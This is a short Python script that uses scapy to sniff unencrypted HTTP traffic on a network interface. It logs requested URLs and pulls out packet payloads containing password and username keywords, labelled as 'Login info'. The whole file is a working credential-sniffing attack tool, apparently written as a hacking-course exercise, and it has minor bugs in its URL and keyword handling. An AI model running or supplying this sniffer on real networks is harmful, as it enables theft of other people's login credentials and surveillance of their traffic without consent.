#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
from termcolor import colored

def get_interface():
    import optparse
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface to sniff packets on")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("Specify an interface")
    else:
        return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=filter_func)

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    e = ["org", "com", "ge", "ru", "net", "co", "us", "to", "info", "app", "shop", "io", "me", "ca"]
    ends = [x + "/" for x in e]
    if url.endswith("jpg") or url.endswith("jpeg") or url.endswith("png"):
        return colored(url, "cyan")
    for end in ends:
        if url.endswith(end):
            return colored(url, "red")
        return url
    return None

def get_login_info(packet):
    keys = ["pass", "passw", "passwd", "password", "username", "user", "name", "uname"]
    for key in keys:
        if key in packet[scapy.Raw].load:
            return colored(packet[scapy.Raw].load, "green")
    return None

def filter_func(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        if url:
            print("Http request >> " + url)
        if packet.haslayer(scapy.Raw) and get_login_info(packet):
            print("\nLogin info >> " + get_login_info(packet) + "\n")

interface = get_interface()
sniff(interface.interface)